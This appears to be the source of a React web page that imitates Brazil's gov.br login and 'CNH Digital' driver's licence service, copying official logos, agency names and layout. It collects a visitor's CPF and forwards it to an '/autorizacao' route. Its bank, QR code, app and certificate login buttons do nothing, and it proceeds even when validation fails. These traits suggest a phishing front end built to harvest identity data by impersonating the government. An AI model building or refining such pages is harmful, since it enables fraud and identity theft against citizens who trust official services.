import { useState } from "react";
import { useLocation } from "wouter";
import { validarCPF } from "@/lib/utils";
import {
  CreditCard,
  Building2,
  QrCode,
  Smartphone,
  Cloud,
  AlertTriangle,
  Lock,
} from "lucide-react";

export default function CNHLanding() {
  const [, setLocation] = useLocation();
  const [tela, setTela] = useState<"capa" | "login">("capa");
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const mascaraCPF = (val: string) => {
    let v = val.replace(/\D/g, "").slice(0, 11);
    if (v.length > 9) {
      v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, "$1.$2.$3-$4");
    } else if (v.length > 6) {
      v = v.replace(/(\d{3})(\d{3})(\d{0,3})/, "$1.$2.$3");
    } else if (v.length > 3) {
      v = v.replace(/(\d{3})(\d{0,3})/, "$1.$2");
    }
    return v;
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setError("");
    setCpf(mascaraCPF(e.target.value));
  };

  const handleContinue = async () => {
    const digits = cpf.replace(/\D/g, "");
    if (digits.length < 11 || !validarCPF(digits)) {
      setError("CPF informado inválido. (ERL0000500)");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const res = await fetch(`/api/cnh/validate?cpf=${digits}`);
      const json = await res.json().catch(() => ({}));
      if (json.success && json.data) {
        setLocation(`/autorizacao?cpf=${digits}`);
      } else {
        setError("CPF não cadastrado no sistema CDT.");
      }
    } catch {
      // Fallback para permitir navegação mesmo se a API der timeout
      setLocation(`/autorizacao?cpf=${digits}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="flex h-[100dvh] w-full items-center justify-center bg-black font-['Raleway','Rawline',sans-serif] overflow-hidden antialiased">
      {/* ─── TELA 1: CAPA DA CNH ─── */}
      {tela === "capa" && (
        <div className="relative flex h-full w-full max-w-[450px] flex-col bg-white shadow-2xl">
          {/* Top Cover Image / Banner */}
          <div className="relative h-[65%] w-full flex-shrink-0 bg-[#071D41] overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-b from-[#071D41]/80 via-[#0d2859]/60 to-[#071D41]" />
            <div className="relative flex h-full flex-col items-center justify-center p-6 text-center text-white">
              <div className="mb-3 rounded-full border border-white/20 bg-white/10 px-4 py-1 text-[11px] font-bold uppercase tracking-[0.25em] text-blue-200">
                Carteira Digital de Trânsito
              </div>
              <h1 className="text-3xl font-extrabold leading-tight tracking-tight sm:text-4xl">
                CNH Digital
              </h1>
              <p className="mt-2 text-xs text-blue-100/90 max-w-xs">
                Secretaria Nacional de Trânsito — SENATRAN / SERPRO
              </p>
            </div>
            <div className="absolute inset-x-0 top-0 h-24 bg-gradient-to-b from-black/40 to-transparent" />
          </div>

          {/* Bottom Card White Area */}
          <div className="relative z-10 -mt-6 flex flex-1 flex-col items-center justify-between rounded-t-[25px] bg-white px-8 py-6 text-center shadow-lg">
            <div className="flex flex-col items-center gap-3">
              <div className="flex items-center gap-2">
                <img
                  src="/assets/govbr-logo.png"
                  alt="gov.br"
                  className="h-7 w-auto object-contain"
                />
                <span className="text-xs font-bold uppercase tracking-wider text-[#071D41]">
                  | CNH Digital
                </span>
              </div>

              <p className="text-[12px] leading-snug text-slate-700">
                Ao entrar, você concorda com nosso <br />
                <a href="#" className="font-semibold text-[#1351b4] underline">
                  Termo de Responsabilidade
                </a>{" "}
                e <br />
                <a href="#" className="font-semibold text-[#1351b4] underline">
                  Política de Privacidade
                </a>
              </p>
            </div>

            <button
              onClick={() => setTela("login")}
              className="mt-4 w-full rounded-full bg-[#1351b4] py-3.5 text-center text-sm font-bold uppercase tracking-wider text-white shadow-md shadow-blue-900/25 transition-transform active:scale-[0.98]"
            >
              ENTRAR COM gov.br
            </button>
          </div>
        </div>
      )}

      {/* ─── TELA 2: IDENTIFIQUE-SE NO GOV.BR ─── */}
      {tela === "login" && (
        <div className="flex h-full w-full max-w-[400px] flex-col items-center bg-[#f6f6f6] overflow-y-auto">
          {/* Header gov.br */}
          <header className="flex w-full items-center justify-start bg-white px-5 py-4 shadow-sm">
            <img
              src="/assets/govbr-logo.png"
              alt="gov.br"
              className="h-7 w-auto object-contain"
            />
          </header>

          {/* Card Principal de Login */}
          <main className="my-5 w-[calc(100%-32px)] rounded-lg bg-white p-6 shadow-md border border-slate-200">
            <h2 className="text-lg font-bold text-slate-900">
              Identifique-se no gov.br
            </h2>

            <div className="mt-4 flex items-center gap-2 text-sm font-bold text-slate-800">
              <CreditCard size={18} className="text-[#1351b4]" />
              <span>Número do CPF</span>
            </div>

            <p className="mt-1 text-xs text-slate-600">
              Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
            </p>

            <div className="mt-5 space-y-1.5">
              <label className="block text-xs font-bold text-slate-700">
                CPF
              </label>
              <input
                type="tel"
                value={cpf}
                onChange={handleCpfChange}
                placeholder="Digite seu CPF"
                maxLength={14}
                className="w-full rounded border border-slate-300 bg-white px-3.5 py-2.5 text-sm text-slate-900 outline-none transition focus:border-[#d84800] focus:bg-[#ffee0169] focus:ring-1 focus:ring-[#d84800]"
              />
            </div>

            {error && (
              <div className="mt-4 flex items-center gap-3 rounded bg-[#fbf5d0] border border-[#e5c22d] px-3.5 py-2.5 text-xs font-medium text-slate-900">
                <AlertTriangle size={18} className="text-amber-600 flex-shrink-0" />
                <span>{error}</span>
              </div>
            )}

            <button
              onClick={handleContinue}
              disabled={loading}
              className="mt-5 w-full rounded-full bg-[#1351b4] py-3 text-center text-sm font-semibold text-white shadow-sm transition hover:bg-[#0f4aa3] active:scale-[0.99] disabled:opacity-75"
            >
              {loading ? "Verificando..." : "Continuar"}
            </button>

            <div className="mt-7 border-t border-slate-200 pt-5">
              <p className="text-xs font-bold text-slate-800">
                Outras opções de identificação:
              </p>

              <div className="mt-3 space-y-2">
                <button
                  type="button"
                  className="flex w-full items-center justify-between rounded-full border border-slate-300 bg-white px-4 py-2.5 text-xs font-semibold text-[#1351b4] transition hover:bg-slate-50"
                >
                  <div className="flex items-center gap-2.5">
                    <Building2 size={16} />
                    <span>Login com seu banco</span>
                  </div>
                  <span className="rounded bg-[#008f43] px-1.5 py-0.5 text-[9px] font-bold text-white uppercase">
                    SUA CONTA SERÁ PRATA
                  </span>
                </button>

                <button
                  type="button"
                  className="flex w-full items-center gap-2.5 rounded-full border border-slate-300 bg-white px-4 py-2.5 text-xs font-semibold text-[#1351b4] transition hover:bg-slate-50"
                >
                  <QrCode size={16} />
                  <span>Login com QR code</span>
                </button>

                <button
                  type="button"
                  className="flex w-full items-center gap-2.5 rounded-full border border-slate-300 bg-white px-4 py-2.5 text-xs font-semibold text-[#1351b4] transition hover:bg-slate-50"
                >
                  <Smartphone size={16} />
                  <span>Seu aplicativo gov.br</span>
                </button>

                <button
                  type="button"
                  className="flex w-full items-center gap-2.5 rounded-full border border-slate-300 bg-white px-4 py-2.5 text-xs font-semibold text-[#1351b4] transition hover:bg-slate-50"
                >
                  <Cloud size={16} />
                  <span>Seu certificado digital em nuvem</span>
                </button>
              </div>

              <footer className="mt-6 text-center text-[11px] text-slate-500">
                Ministério da Gestão e da Inovação em Serviços Públicos
              </footer>
            </div>
          </main>
        </div>
      )}
    </div>
  );
}
